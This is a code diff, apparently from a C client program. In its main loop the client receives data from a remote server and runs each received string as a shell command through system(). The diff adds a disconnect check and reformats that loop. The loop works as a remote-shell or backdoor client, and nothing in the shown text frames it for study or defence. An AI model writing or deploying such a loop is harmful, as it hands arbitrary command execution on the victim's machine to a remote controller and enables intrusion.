@@ -20,8 +20,8 @@ int main(void)
     //check if the struct has been filled
     if (server_con.dest_ip == NULL)
     {
-      printf("[+] Could not connect to server.\n");
-      exit(-1);
+        printf("[+] Could not connect to server.\n");
+        exit(-1);
     }
 
     printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
@@ -29,19 +29,27 @@ int main(void)
     int exit = 0;
     do
     {
-      message data_recieved = recieve_data(server_con);
-      printf("[+] Server said: %s\n", data_recieved.data);
-      if (strcmp(data_recieved.data, "exit") == 0)
-      {
-        exit = 1;
-      }
-      else
-      {
-        system(data_recieved.data);
-      }
+        message data_recieved = recieve_data(server_con);
+
+        // Close client if server exits
+        if (data_recieved.bytes_recv < 1)
+        {
+            exit = 1;
+            break;
+        }
+        printf("[+] Server said: %s\n", data_recieved.data);
+        if (strcmp(data_recieved.data, "exit") == 0)
+        {
+            exit = 1;
+        }
+        else
+        {
+            system(data_recieved.data);
+        }
 
     }while(exit == 0 && kill_rcv == 0);
 
+    // Print statement for testing purposes only. Will be removed from final copy.
     printf("[+] Closing connection\n");
     // Close file descriptor
     close(server_con.sock_fd);
